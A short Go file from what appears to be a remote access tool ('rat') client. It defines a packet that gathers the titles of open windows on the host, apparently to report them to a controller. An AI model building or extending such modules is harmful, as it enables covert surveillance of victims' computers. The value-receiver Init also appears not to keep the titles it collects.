package main

import (
	"rat/client/windows"
	"rat/common"
)

type WindowsPacket struct {
	Titles []string `send`
}

func (packet WindowsPacket) Header() common.PacketHeader {
	return common.WindowsHeader
}

func (packet WindowsPacket) Init() {
	windows.QueryWindows()

	for _, win := range windows.Windows {
		packet.Titles = append(packet.Titles, win.Title)
	}
}

func (packet WindowsPacket) OnReceive() error {
	Queue <- WindowsPacket{}

	return nil
}
